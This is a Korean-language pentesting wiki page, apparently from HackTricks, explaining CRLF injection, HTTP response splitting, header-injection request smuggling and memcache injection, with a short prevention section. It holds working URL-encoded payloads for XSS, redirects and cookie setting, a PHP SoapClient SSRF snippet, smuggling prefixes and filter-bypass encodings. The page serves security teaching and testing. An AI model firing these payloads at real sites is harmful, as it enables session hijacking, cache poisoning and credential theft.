# CRLF (%0D%0A) Injection

{{#include ../banners/hacktricks-training.md}}

<figure><img src="../images/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **Intigriti**에 **가입하세요**, 해커를 위해 해커가 만든 프리미엄 **버그 바운티 플랫폼**입니다! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받기 시작하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Carriage Return (CR)와 Line Feed (LF)는 함께 CRLF로 알려져 있으며, HTTP 프로토콜에서 줄의 끝이나 새로운 줄의 시작을 나타내기 위해 사용되는 특수 문자 시퀀스입니다. 웹 서버와 브라우저는 CRLF를 사용하여 HTTP 헤더와 응답 본문을 구분합니다. 이러한 문자는 Apache 및 Microsoft IIS와 같은 다양한 웹 서버 유형에서 HTTP/1.1 통신에 보편적으로 사용됩니다.

### CRLF Injection 취약점

CRLF 인젝션은 사용자 제공 입력에 CR 및 LF 문자를 삽입하는 것을 포함합니다. 이 작업은 서버, 애플리케이션 또는 사용자가 삽입된 시퀀스를 하나의 응답의 끝과 다른 응답의 시작으로 해석하도록 오도합니다. 이러한 문자는 본질적으로 해롭지 않지만, 잘못 사용될 경우 HTTP 응답 분할 및 기타 악의적인 활동으로 이어질 수 있습니다.

### 예: 로그 파일에서의 CRLF Injection

[여기에서 예시](https://www.invicti.com/blog/web-security/crlf-http-header/)를 고려하세요. 관리 패널의 로그 파일은 `IP - 시간 - 방문한 경로` 형식을 따릅니다. 일반적인 항목은 다음과 같을 수 있습니다:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
공격자는 CRLF 주입을 이용하여 이 로그를 조작할 수 있습니다. HTTP 요청에 CRLF 문자를 주입함으로써, 공격자는 출력 스트림을 변경하고 로그 항목을 조작할 수 있습니다. 예를 들어, 주입된 시퀀스는 로그 항목을 다음과 같이 변형할 수 있습니다:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
여기서 `%0d`와 `%0a`는 CR과 LF의 URL 인코딩 형태를 나타냅니다. 공격 후, 로그는 잘못된 방식으로 표시될 것입니다:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
공격자는 localhost(서버 환경 내에서 일반적으로 신뢰되는 엔티티)가 작업을 수행한 것처럼 보이게 하여 악의적인 활동을 숨깁니다. 서버는 `%0d%0a`로 시작하는 쿼리의 일부를 단일 매개변수로 해석하고, `restrictedaction` 매개변수는 별도의 입력으로 구문 분석됩니다. 조작된 쿼리는 합법적인 관리 명령을 효과적으로 모방합니다: `/index.php?page=home&restrictedaction=edit`

### HTTP 응답 분할

#### 설명

HTTP 응답 분할은 공격자가 HTTP 응답의 구조를 악용할 때 발생하는 보안 취약점입니다. 이 구조는 특정 문자 시퀀스인 캐리지 리턴(CR)과 라인 피드(LF)를 사용하여 헤더와 본문을 구분하며, 이를 CRLF라고 합니다. 공격자가 응답 헤더에 CRLF 시퀀스를 삽입하는 데 성공하면, 이후 응답 내용을 효과적으로 조작할 수 있습니다. 이러한 유형의 조작은 심각한 보안 문제, 특히 교차 사이트 스크립팅(XSS)으로 이어질 수 있습니다.

#### HTTP 응답 분할을 통한 XSS

1. 애플리케이션은 다음과 같은 사용자 정의 헤더를 설정합니다: `X-Custom-Header: UserInput`
2. 애플리케이션은 쿼리 매개변수에서 `UserInput`의 값을 가져옵니다. 예를 들어 "user_input". 적절한 입력 검증 및 인코딩이 없는 시나리오에서 공격자는 CRLF 시퀀스와 악의적인 콘텐츠를 포함하는 페이로드를 작성할 수 있습니다.
3. 공격자는 특별히 조작된 'user_input'을 가진 URL을 작성합니다: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
- 이 URL에서 `%0d%0a%0d%0a`는 CRLFCRLF의 URL 인코딩된 형태입니다. 이는 서버를 속여 CRLF 시퀀스를 삽입하게 하여 서버가 이후 부분을 응답 본문으로 처리하게 만듭니다.
4. 서버는 응답 헤더에 공격자의 입력을 반영하여 악의적인 스크립트가 응답 본문의 일부로 브라우저에 의해 해석되는 의도하지 않은 응답 구조를 초래합니다.

#### 리디렉션으로 이어지는 HTTP 응답 분할의 예

From [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Browser to:
```
/%0d%0aLocation:%20http://myweb.com
```
서버는 다음과 같은 헤더로 응답합니다:
```
Location: http://myweb.com
```
**다른 예: (출처** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### URL 경로에서

서버의 **응답**을 제어하기 위해 **URL 경로 안에** 페이로드를 보낼 수 있습니다 (예시는 [여기](https://hackerone.com/reports/192667)에서):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
더 많은 예시는 다음에서 확인하세요:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP 헤더 주입

HTTP 헤더 주입은 CRLF (Carriage Return and Line Feed) 주입을 통해 자주 악용되며, 공격자가 HTTP 헤더를 삽입할 수 있게 합니다. 이는 XSS (Cross-Site Scripting) 필터나 SOP (Same-Origin Policy)와 같은 보안 메커니즘을 무력화할 수 있으며, CSRF 토큰과 같은 민감한 데이터에 대한 무단 접근이나 쿠키 삽입을 통한 사용자 세션 조작으로 이어질 수 있습니다.

#### HTTP 헤더 주입을 통한 CORS 악용

공격자는 HTTP 헤더를 주입하여 CORS (Cross-Origin Resource Sharing)를 활성화할 수 있으며, 이는 SOP에 의해 부과된 제한을 우회합니다. 이 침해는 악의적인 출처의 스크립트가 다른 출처의 리소스와 상호작용할 수 있게 하여, 보호된 데이터에 접근할 수 있게 합니다.

#### CRLF를 통한 SSRF 및 HTTP 요청 주입

CRLF 주입은 완전히 새로운 HTTP 요청을 작성하고 주입하는 데 활용될 수 있습니다. 이의 주목할 만한 예는 PHP의 `SoapClient` 클래스의 취약점으로, 특히 `user_agent` 매개변수 내에서 발생합니다. 이 매개변수를 조작함으로써, 공격자는 추가 헤더와 본문 내용을 삽입하거나 심지어 완전히 새로운 HTTP 요청을 주입할 수 있습니다. 아래는 이 악용을 보여주는 PHP 예제입니다:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### 헤더 주입을 통한 요청 밀수

이 기술과 잠재적인 문제에 대한 자세한 내용은 [**원본 소스 확인**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)을 참조하세요.

필수 헤더를 주입하여 **백엔드가 초기 요청에 응답한 후 연결을 유지하도록** 할 수 있습니다:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
그 후, 두 번째 요청을 지정할 수 있습니다. 이 시나리오는 일반적으로 [HTTP request smuggling](http-request-smuggling/)과 관련이 있으며, 서버가 주입 후 추가한 헤더나 본문 요소가 다양한 보안 취약점을 초래할 수 있는 기술입니다.

**악용:**

1. **악의적인 접두사 주입**: 이 방법은 악의적인 접두사를 지정하여 다음 사용자의 요청이나 웹 캐시를 오염시키는 것입니다. 예시는 다음과 같습니다:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **응답 큐 오염을 위한 접두사 작성**: 이 접근법은 후행 쓰레기와 결합될 때 완전한 두 번째 요청을 형성하는 접두사를 만드는 것입니다. 이는 응답 큐 오염을 유발할 수 있습니다. 예시는 다음과 같습니다:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Memcache 주입

Memcache는 **명확한 텍스트 프로토콜을 사용하는 키-값 저장소**입니다. 자세한 내용은 다음을 참조하십시오:

{{#ref}}
../network-services-pentesting/11211-memcache/
{{#endref}}

**전체 정보는**[ **원본 작성물**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/) **을 읽어보십시오.**

플랫폼이 **HTTP 요청에서 데이터를 가져와 이를 정화하지 않고** **memcache** 서버에 **요청**을 수행하는 경우, 공격자는 이 동작을 악용하여 **새로운 memcache 명령을 주입**할 수 있습니다.

예를 들어, 원래 발견된 취약점에서는 캐시 키가 사용자가 연결해야 할 IP와 포트를 반환하는 데 사용되었으며, 공격자는 **memcache 명령을 주입**하여 **캐시를 오염시켜 피해자의 세부정보**(사용자 이름 및 비밀번호 포함)를 공격자 서버로 전송할 수 있었습니다:

<figure><img src="../images/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

게다가, 연구자들은 공격자가 알지 못하는 사용자의 이메일로 공격자의 IP와 포트를 전송하기 위해 memcache 응답을 비동기화할 수 있다는 것을 발견했습니다:

<figure><img src="../images/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### 웹 애플리케이션에서 CRLF / HTTP 헤더 주입 방지 방법

웹 애플리케이션에서 CRLF(캐리지 리턴 및 라인 피드) 또는 HTTP 헤더 주입의 위험을 완화하기 위해 다음 전략이 권장됩니다:

1. **응답 헤더에 직접 사용자 입력 피하기**: 가장 안전한 접근법은 사용자 제공 입력을 응답 헤더에 직접 포함하지 않는 것입니다.
2. **특수 문자 인코딩**: 직접 사용자 입력을 피할 수 없는 경우, CR(캐리지 리턴) 및 LF(라인 피드)와 같은 특수 문자를 인코딩하는 전용 함수를 사용해야 합니다. 이 관행은 CRLF 주입 가능성을 방지합니다.
3. **프로그래밍 언어 업데이트**: 웹 애플리케이션에서 사용하는 프로그래밍 언어를 정기적으로 최신 버전으로 업데이트하십시오. HTTP 헤더를 설정하는 함수 내에서 CR 및 LF 문자의 주입을 본질적으로 허용하지 않는 버전을 선택하십시오.

### CHEATSHEET

[여기에서 치트시트를 확인하세요](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## 자동 도구

- [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
- [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## 무차별 대입 탐지 목록

- [https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt)

## 참고 문헌

- [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
- [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
- [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
- [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../images/i3.png" alt=""><figcaption></figcaption></figure>

**버그 바운티 팁**: **Intigriti**에 **가입하세요**, 해커를 위해 해커가 만든 프리미엄 **버그 바운티 플랫폼**입니다! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받기 시작하세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../banners/hacktricks-training.md}}
